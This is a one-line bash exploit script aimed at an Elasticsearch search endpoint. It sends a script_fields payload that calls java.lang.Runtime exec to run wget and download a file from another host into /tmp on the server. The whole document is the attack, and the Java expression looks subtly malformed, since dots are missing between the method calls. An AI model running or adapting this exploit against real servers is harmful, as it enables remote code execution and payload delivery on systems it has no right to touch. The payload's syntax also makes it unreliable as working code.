#!/usr/bin/env bash
curl http://192.168.99.100:9200/_search?pretty?x=1 -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\") getRuntime() exec(\"wget -O /tmp/testy http://192.168.1.1:8080/es_test.txt\")"}}}'
